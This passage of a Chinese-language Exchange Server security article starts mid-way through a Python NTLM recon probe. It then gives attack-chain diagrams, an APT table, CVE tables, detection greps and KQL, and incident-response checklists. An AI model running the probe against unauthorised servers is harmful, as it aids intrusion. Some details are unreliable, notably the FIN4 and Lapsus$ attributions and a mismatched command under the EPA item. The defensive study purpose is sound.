        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, 143))
        banner = sock.recv(1024).decode(errors="ignore")
        print(f"[+] IMAP Banner: {banner.strip()}")

        sock.send(b"a001 CAPABILITY\r\n")
        cap_resp = sock.recv(4096).decode(errors="ignore")
        if "NTLM" in cap_resp or "GSSAPI" in cap_resp:
            print("[!] IMAP NTLM/GSSAPI authentication available!")
        sock.close()
    except Exception as e:
        print(f"[-] IMAP check failed: {e}")

    print("[*] Stage 3: Checking Exchange EWS NTLM...")
    try:
        resp = requests.get(
            f"{base_url}/ews/exchange.asmx",
            headers={
                "Authorization": "NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=",
                "User-Agent": "Mozilla/5.0",
            },
            verify=False,
            timeout=10
        )
        if resp.status_code == 401:
            auth_header = resp.headers.get("WWW-Authenticate", "")
            if "NTLM" in auth_header:
                print("[+] EWS NTLM authentication challenge received")
                challenge = auth_header.replace("NTLM ", "")
                decoded = base64.b64decode(challenge)
                if len(decoded) >= 32:
                    target_info_offset = 40
                    if len(decoded) > target_info_offset + 12:
                        target_name_len = struct.unpack("<H", decoded[12:14])[0]
                        target_name_offset = struct.unpack("<I", decoded[16:20])[0]
                        if target_name_offset + target_name_len <= len(decoded):
                            target_name = decoded[target_name_offset:target_name_offset+target_name_len].decode("utf-16-le", errors="ignore")
                            print(f"[+] Domain/Server name: {target_name}")
    except Exception:
        pass

detect_ntlm_relay_vectors("192.168.1.1")
```

## 0x08 后利用技术

### 8.1 Web Shell 持久化

ProxyLogon/ProxyShell/ProxyNotShell 链的最终目标通常是在 Exchange 服务器上部署 Web Shell：

```
常见 Web Shell 位置:
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\
C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\ecp\
C:\inetpub\wwwroot\aspnet_client\
C:\inetpub\wwwroot\aspnet_client\system_web\4_0_30319\

已知 Web Shell 名称 (HAFNIUM/FIN 系列):
discoverx.aspx, error.aspx, errorcheck.aspx, t.aspx, web.aspx
one.aspx, two.aspx, aspnet_www.aspx, aspnet_client.aspx
```

```powershell
Get-ChildItem -Path "C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy" \
  -Recurse -Include "*.aspx","*.ashx","*.asmx" |
  Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-90) } |
  Sort-Object LastWriteTime -Descending |
  Select-Object FullName, LastWriteTime, Length
```

### 8.2 邮箱数据窃取

```powershell
Search-AdminAuditLog -Cmdlets \
  New-MailboxExportRequest, New-MailboxSearch, Search-Mailbox |
  Select-Object Caller, CmdletName, ObjectName, RunDate

Get-TransportRule | Select-Object Name, State, Priority, \
  BlindCopyTo, RedirectMessageTo, DeleteMessage | Format-List

Get-MailboxPermission -Identity * |
  Where-Object { $_.AccessRights -eq "FullAccess" -and $_.IsInherited -eq $false }
```

### 8.3 Exchange 管理组持久化

```powershell
$groups = @(
  "Organization Management",
  "Exchange Trusted Subsystem",
  "Exchange Windows Permissions",
  "Exchange Servers"
)
foreach ($group in $groups) {
  Write-Host "=== $group ==="
  Get-ADGroupMember -Identity $group -Recursive |
    Select-Object Name, SamAccountName, objectClass
}
```

### 8.4 EWS / PowerShell 滥用

```powershell
Get-LogonStatistics | Where-Object {
  $_.ApplicationName -eq "RemotePowerShell"
} | Select-Object UserName, IPAddress, ApplicationName

Get-LogonStatistics | Where-Object {
  $_.ApplicationName -eq "ExchangeServices"
} | Select-Object UserName, IPAddress
```

### 8.5 邮件转发规则持久化

```powershell
Get-TransportRule | Select-Object Name, State, Priority, \
  FromScope, SentTo, BlindCopyTo, RedirectMessageTo, \
  DeleteMessage, QuarantineMode | Format-List

Search-AdminAuditLog -Cmdlets New-TransportRule, Set-TransportRule, \
  Remove-TransportRule |
  Select-Object Caller, CmdletName, ObjectName, RunDate, Parameters
```

## 0x09 漏洞组合攻击链

### 9.1 攻击链一: ProxyLogon → Web Shell → 域接管

```
CVE-2021-26855 (SSRF 入口)
    ↓ 通过伪造 Cookie/Header 绕过认证
CVE-2021-26857 (反序列化 RCE)
    ↓ 通过 .NET BinaryFormatter 执行任意代码
CVE-2021-26858/27065 (文件写入)
    ↓ 写入 Web Shell 到 IIS 目录
Web Shell 持久化
    ↓ 部署 China Chopper / ASPXSpy 等 Web Shell
凭据窃取
    ↓ Mimikatz / procdump 提取 LSASS
    ↓ 从邮箱中提取密码、令牌
AD 域接管
    ↓ Exchange 服务账号通常拥有高权限 AD 组
    ↓ DCSync / Golden Ticket / WriteDacl
```

### 9.2 攻击链二: ProxyShell → 邮箱窃取 → 鱼叉钓鱼

```
CVE-2021-34473 (路径穿越)
    ↓ 通过 X-Rewrite-URL 绕过前端验证
CVE-2021-34523 (权限提升)
    ↓ Autodiscover SSRF 获取 SYSTEM 权限
CVE-2021-31207 (UM RCE)
    ↓ Unified Messaging 反序列化执行代码
邮箱数据导出
    ↓ 导出全员邮箱内容（邮件、联系人、附件）
鱼叉式钓鱼
    ↓ 利用内部邮件内容和上下文构造精准钓鱼
    ↓ 以组织名义发送绕过 SPF/DKIM 的钓鱼邮件
```

### 9.3 攻击链三: ProxyNotShell → PowerShell → 勒索部署

```
低权限邮箱账户
    ↓ 注册或获取任意低权限账户
CVE-2022-41040 (SSRF)
    ↓ 通过 Autodiscover 触发带身份 SSRF
CVE-2022-41082 (PowerShell RCE)
    ↓ URL Rewrite 绕过 + 序列化执行
SYSTEM 权限 RCE
    ↓ 直接在 Exchange 服务器上执行命令
横向移动
    ↓ 从 Exchange 服务器横向到域控
    ↓ Exchange 服务账号通常在 Exchange Windows Permissions 组
勒索软件部署
    ↓ LockBit / BlackCat / Play 勒索组织
```

### 9.4 攻击链四: NTLM Relay → 域权限提升

```
CVE-2024-21410 (NTLM 泄露)
    ↓ 通过邮件规则触发 Exchange 向外部发起 NTLM 认证
NTLM Relay
    ↓ 中继到域控制器 LDAP (389/636)
权限提升
    ↓ 利用 Exchange 机器账户的 LDAP 权限
    ↓ 创建计算机账户 / 修改 AD 对象 / RBCD
域接管
    ↓ 通过 RBCD 委派获取域控 Shell
    ↓ 或创建 Golden Ticket
```

### 9.5 APT 威胁组织 TTP

| 威胁组织 | 类型 | 使用的 CVE | 技术特征 |
|---------|------|-----------|---------|
| HAFNIUM | 国家级 APT | ProxyLogon 全系列 | 大规模 ProxyLogon 利用、Web Shell 部署、邮箱窃取 |
| Lapsus$ | 勒索/黑客组织 | ProxyShell | ProxyShell 链利用、公开炫耀式攻击 |
| LockBit 3.0 | 勒索组织 | ProxyNotShell, Citrix Bleed | ProxyNotShell RCE → 勒索部署 |
| FIN4 | 国家级 APT | ProxyLogon | 邮箱数据窃取、内幕交易情报 |
| APT29 (Cozy Bear) | 国家级 APT | ProxyLogon, NTLM Relay | 政府机构持续攻击 |
| Turla | 国家级 APT | ProxyLogon | Exchange Web Shell 持久化 |
| 多个勒索联盟 | 勒索组织 | ProxyShell, ProxyNotShell | 批量扫描、快速勒索部署 |

## 0x0A 历史 CVE 漏洞时间线

### 2020 — 前置漏洞

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2020-0688 | 2020 | 8.8 | 反序列化 | Exchange 控制面板远程代码执行，硬编码验证密钥 |
| CVE-2020-16875 | 2020 | 7.5 | 信息泄露 | Exchange DLP 策略信息泄露 |
| CVE-2020-17117 | 2020 | 7.5 | 信息泄露 | Exchange 信息泄露 |
| CVE-2020-17132 | 2020 | 5.3 | 欺骗 | Exchange 安全功能绕过 |
| CVE-2020-17141 | 2020 | 8.8 | RCE | Exchange 远程代码执行 |

### 2021 — Proxy 系列爆发

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2021-26855 | 2021 | 9.8 | SSRF | ProxyLogon 入口，HAFNIUM 大规模利用，CISA KEV |
| CVE-2021-26857 | 2021 | 7.8 | RCE | ProxyLogon 反序列化 RCE |
| CVE-2021-26858 | 2021 | 7.8 | 文件写入 | ProxyLogon OAB 路径穿越 |
| CVE-2021-27065 | 2021 | 7.8 | 文件写入 | ProxyLogon ECP 路径穿越 |
| CVE-2021-31195 | 2021 | 8.6 | 认证绕过 | ProxyOracle 认证预言机 |
| CVE-2021-31196 | 2021 | 8.6 | Cookie 伪造 | ProxyOracle Cookie 伪造绕过 2FA |
| CVE-2021-31207 | 2021 | 9.8 | RCE | ProxyShell UM 反序列化 RCE，CISA KEV |
| CVE-2021-33768 | 2021 | 7.4 | 信息泄露 | Exchange 信息泄露 |
| CVE-2021-34473 | 2021 | 9.8 | 路径穿越 | ProxyShell 入口，CISA KEV |
| CVE-2021-34523 | 2021 | 9.8 | 权限提升 | ProxyShell 权限提升 |

### 2022 — ProxyNotShell 与 OWASSRF

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2022-41040 | 2022 | 8.3 | SSRF | ProxyNotShell SSRF 入口，CISA KEV |
| CVE-2022-41082 | 2022 | 9.8 | RCE | ProxyNotShell PowerShell RCE，CISA KEV |
| CVE-2022-41080 | 2022 | 8.8 | SSRF | OWASSRF 认证 SSRF + NTLM 泄露 |
| CVE-2022-41079 | 2022 | 7.5 | 欺骗 | Exchange 安全功能绕过 |
| CVE-2022-41123 | 2022 | 7.5 | 欺骗 | Exchange 安全功能绕过 |
| CVE-2022-41032 | 2022 | 8.8 | RCE | Exchange 远程代码执行 |

### 2023-2024 — NTLM Relay 系列

| CVE 编号 | 年份 | CVSS | 类型 | 影响 |
|----------|------|------|------|------|
| CVE-2023-21529 | 2023 | 7.5 | NTLM 泄露 | 预认证 NTLM Relay，可中继至 AD |
| CVE-2023-21762 | 2023 | 7.5 | 信息泄露 | Exchange 信息泄露 |
| CVE-2023-23397 | 2023 | 9.8 | 凭据泄露 | Outlook NTLM 泄露，CISA KEV |
| CVE-2023-36757 | 2023 | 7.4 | 安全绕过 | Exchange 安全功能绕过 |
| CVE-2024-21410 | 2024 | 8.4 | NTLM 泄露 | NTLM Relay 2.0，补丁绕过，CISA KEV |
| CVE-2024-26198 | 2024 | 5.3 | 信息泄露 | Exchange 信息泄露 |

### 漏洞类型分布

| 漏洞类型 | CVE 数量 | 代表性 CVE |
|---------|---------|-----------|
| SSRF | 4 | CVE-2021-26855, CVE-2022-41040, CVE-2022-41080 |
| RCE / 反序列化 | 5 | CVE-2021-26857, CVE-2021-31207, CVE-2022-41082 |
| 认证绕过 / Cookie 伪造 | 3 | CVE-2021-31195, CVE-2021-31196, CVE-2021-34523 |
| 文件写入 / 路径穿越 | 3 | CVE-2021-26858, CVE-2021-27065, CVE-2021-34473 |
| NTLM 泄露 / Relay | 3 | CVE-2023-21529, CVE-2024-21410, CVE-2023-23397 |
| 信息泄露 / 欺骗 | 6 | CVE-2020-16875, CVE-2023-21762, CVE-2024-26198 |

## 0x0B 蓝队检测与应急响应

### 11.1 IIS 日志分析

```bash
# Exchange IIS 日志默认位置
# C:\inetpub\logs\LogFiles\W3SVC1\

# 检测 ProxyLogon SSRF 特征
grep -E "(temp\.js|proxylogon|X-AnonResource|X-BEResource)" /var/log/exchange/iis/*.log

# 检测 ProxyShell 路径穿越
grep -E "autodiscover\.json\?@" /var/log/exchange/iis/*.log

# 检测 ProxyNotShell URL Rewrite 绕过
grep -E "(\]\/|\]\/\.\.\/|\/a\])" /var/log/exchange/iis/*.log

# 检测 Web Shell 访问
grep -E "(discoverx|errorcheck|error\.aspx|t\.aspx|web\.aspx|one\.aspx|two\.aspx)" \
  /var/log/exchange/iis/*.log

# 检测异常 EWS/MAPI 访问
grep -E "(\/ews\/|\/mapi\/|\/powershell\/)" /var/log/exchange/iis/*.log | \
  awk '{print $1, $5, $6, $7}' | sort | uniq -c | sort -rn | head -20

# 检测异常 User-Agent
grep -E "ExchangeServices|PowerShell|python-requests|curl" /var/log/exchange/iis/*.log | \
  awk '{print $1, $12}' | sort | uniq -c | sort -rn | head -20
```

### 11.2 Exchange Admin Audit 日志

```powershell
Search-AdminAuditLog -StartDate (Get-Date).AddDays(-30) -Cmdlets \
  New-MailboxExportRequest,
  Add-MailboxPermission,
  Add-ADPermission,
  New-ManagementRoleAssignment,
  New-TransportRule,
  Set-OrganizationConfig,
  New-FederationTrust,
  Set-AuthConfig,
  New-InboxRule,
  Set-Mailbox |
  Select-Object Caller, CmdletName, ObjectName, RunDate,
    @{N='Params';E={$_.Parameters | ForEach-Object { "$($_.Name)=$($_.Value)" }}} |
  Sort-Object RunDate -Descending
```

### 11.3 进程与行为监控

```powershell
# 检测异常子进程 (Web Shell 典型行为)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} -MaxEvents 5000 |
  Where-Object {
    $_.Properties[5].Value -match "w3wp\.exe" -and
    $_.Properties[8].Value -match "powershell|cmd|certutil|wmic|mshta|rundll32"
  } | Select-Object TimeCreated, Message | Format-List

# 检测 UMWorkerProcess 异常父进程 (ProxyShell 特征)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688} -MaxEvents 10000 |
  Where-Object {
    $_.Message -match "UMWorkerProcess" -and
    $_.Message -notmatch "umservice\.exe"
  } | Select-Object TimeCreated, Message
```

### 11.4 KQL 检测规则 (Microsoft 365 Defender / Sentinel)

```kql
// 检测 Exchange Web Shell 文件创建
DeviceFileEvents
| where FolderPath contains @"FrontEnd\HttpProxy"
| where FileName endswith ".aspx" or FileName endswith ".ashx"
| where ActionType == "FileCreated"
| project Timestamp, DeviceName, FileName, FolderPath, InitiatingProcessCommandLine

// 检测异常 EWS 访问模式
CloudAppEvents
| where Application == "Microsoft Exchange Online"
| where ActionType == "Bind" or ActionType contains "FindItem"
| summarize Count = count(), Mailboxes = dcount(RawEventData.MailboxOwnerUPN)
  by ActorDisplayName, ActionType, bin(Timestamp, 1h)
| where Count > 100

// 检测 NTLM Relay 异常登录
SecurityEvent
| where EventID == 4624
| where LogonType == 3
| where AuthenticationPackageName == "NTLM"
| where TargetUserName contains "$"
| project TimeGenerated, TargetUserName, IpAddress, WorkstationName
```

### 11.5 应急响应清单

```
[ ] 确认 Exchange Server 版本与已安装补丁
    - Get-ExchangeServer | Format-List Name, Edition, AdminDisplayVersion
    - 对比 Microsoft Security Response Center (MSRC) 公告

[ ] 排查 ProxyLogon (CVE-2021-26855/26857/26858/27065)
    - 检查 2021-01 至 2021-06 的 IIS 日志
    - 搜索 SSRF 特征路径 (temp.js, proxylogon.js)
    - 检查 Web Shell 文件
    - 审查 EWS/MAPI 异常访问

[ ] 排查 ProxyShell (CVE-2021-34473/34523/31207)
    - 检查 2021-04 至 2021-12 的 IIS 日志
    - 搜索 autodiscover.json?@ 路径穿越特征
    - 检查 UMWorkerProcess.exe 异常父进程
    - 检查 /ews/ 和 /mapi/ 异常访问

[ ] 排查 ProxyNotShell (CVE-2022-41040/41082)
    - 检查 2022-09 至 2023-03 的 IIS 日志
    - 搜索 URL Rewrite 绕过特征 (]/, a]/)
    - 检查 PowerShell 端点异常访问
    - 审查 Admin Audit Log 中的异常 Cmdlet

[ ] 排查 NTLM Relay (CVE-2023-21529/2024-21410)
    - 检查 Exchange 出站 NTLM 认证请求
    - 审查 AD 安全日志中的异常 LDAP 绑定
    - 检查邮件规则中的外部转发配置

[ ] 排查 Web Shell 和后门
    - 扫描 Exchange Web 目录中的非 Microsoft 签名 ASPX 文件
    - 检查 aspnet_client/system_web/ 下的异常子目录
    - 检查 IIS 虚拟目录配置是否被篡改
    - Get-ChildItem -Recurse -Include "*.aspx","*.ashx" | Get-AuthenticodeSignature

[ ] 排查邮箱数据泄露
    - 审查 New-MailboxExportRequest 历史记录
    - 检查 Transport Rule 和 Inbox Rule 异常
    - 检查 FullAccess / SendAs 权限变更
    - 审查 Federation Trust 和 OAuth 配置

[ ] 网络隔离与加固
    - 立即升级到最新 CU + SU
    - 启用 Extended Protection for Authentication (EPA)
    - 禁用不必要的协议和服务
    - 重置所有 Exchange 服务账号密码
    - 重置 AD 域管理员密码
```

## 0x0C 安全审计清单

```
[ ] Exchange Server 已升级到最新 CU + SU
[ ] 所有已知 CVE 已打补丁（对照 MSRC 公告）
[ ] Extended Protection for Authentication (EPA) 已启用
    - 所有虚拟目录 (OWA, ECP, EWS, MAPI, ActiveSync, OAB, PowerShell)
    - Get-ExchangeServer | Get-ClientAccessService | Set-ClientAccessService -AutoDiscoverServiceInternalUri $null
[ ] 管理接口 (EAC) 仅限内网访问
[ ] Exchange Admin Center 已启用 MFA
[ ] Remote PowerShell 已限制为特定管理 IP
[ ] 已禁用不必要的协议（IMAP, POP, 旧版 RPC-over-HTTP）
[ ] 已禁用 Exchange UM（如不需要）
[ ] 已检查并清除 Web Shell 和后门
[ ] 已重置所有 Exchange 服务账号密码
[ ] 已重置所有管理员密码
[ ] 已审查 Exchange AD 安全组成员
    - Organization Management
    - Exchange Trusted Subsystem
    - Exchange Windows Permissions
    - Exchange Servers
[ ] 已审查 FullAccess / SendAs 邮箱权限
[ ] 已审查 Transport Rule 和 Inbox Rule
[ ] 已审查 Federation Trust 和 OAuth 配置
[ ] 已启用 Exchange Admin Audit Log
[ ] 已启用 IIS 日志（含完整 URI + Query String）
[ ] 已配置 SIEM 规则检测 SSRF / Web Shell / NTLM Relay
[ ] 已建立 Exchange 安全基线
[ ] 已建立 Exchange 应急响应预案
[ ] 已订阅 MSRC 安全公告通知
[ ] 已实施网络分段策略
[ ] Exchange 服务器不直接暴露 RDP 到互联网
[ ] SMTP 出站已配置 SPF/DKIM/DMARC
[ ] 已禁用 Basic Authentication（所有协议）
[ ] NTLM 出站已通过组策略限制
[ ] LDAP Signing 和 LDAP Channel Binding 已强制启用
```

## 0x0D 总结

Microsoft Exchange Server 的安全问题核心在于"企业邮件枢纽的超高价值属性"与"复杂 Web 代理架构的持续漏洞"：

1. **Proxy 系列漏洞链的毁灭性影响**: 从 ProxyLogon 到 ProxyNotShell，Exchange 的 CAS 前端代理架构反复成为攻击入口——SSRF + 反序列化 RCE 的组合在 2021-2022 年连续被利用，HAFNIUM 事件导致全球 30,000+ 组织受影响
2. **NTLM 泄露的系统性缺陷**: CVE-2023-21529 和 CVE-2024-21410 证明 Exchange 架构中存在多个可触发出站 NTLM 认证的代码路径，补丁无法一次性关闭所有向量，这是设计层面的系统性问题
3. **邮件平台的战略价值**: Exchange 同时承载全员邮件通信、AD 高权限服务账号、组织架构信息，攻破 Exchange 等于获得了企业通信的"上帝视角"——邮箱窃取、邮件伪造、鱼叉钓鱼、凭据收集一站式完成
4. **EPA 是关键防御分水岭**: Extended Protection for Authentication 通过绑定 NTLM/Kerberos 认证到 TLS 通道，有效阻止了 NTLM Relay 类攻击，但大量组织因兼容性顾虑迟迟未启用

防守方核心策略：
- **及时打补丁**: Exchange 必须在 MSRC 安全公告发布后第一时间评估并部署 CU + SU，ProxyLogon 的教训是补丁延迟 = HAFNIUM 光顾
- **启用 EPA**: 在所有 Exchange 虚拟目录上启用 Extended Protection for Authentication，这是阻止 NTLM Relay 类攻击的最有效手段
- **网络隔离**: Exchange 管理接口（EAC）绝对不暴露于互联网，PowerShell Remoting 仅限堡垒机访问
- **禁用不必要的服务**: 关闭 Exchange UM（ProxyShell 向量）、禁用 Basic Authentication、限制 IMAP/POP
- **持续监控**: 集中收集 IIS 日志 + Admin Audit Log + Windows Event Log，配置 SSRF / Web Shell / NTLM Relay 检测规则
- **邮箱安全审计**: 定期审查 Transport Rule、Inbox Rule、FullAccess/SendAs 权限、Federation Trust 配置
- **AD 联动防护**: 启用 LDAP Signing + LDAP Channel Binding，通过组策略限制 NTLM 出站，监控 Exchange AD 安全组成员变更
- **应急演练**: 建立 Exchange 专项应急响应预案，定期演练 Web Shell 清除、凭据重置、邮箱数据泄露评估流程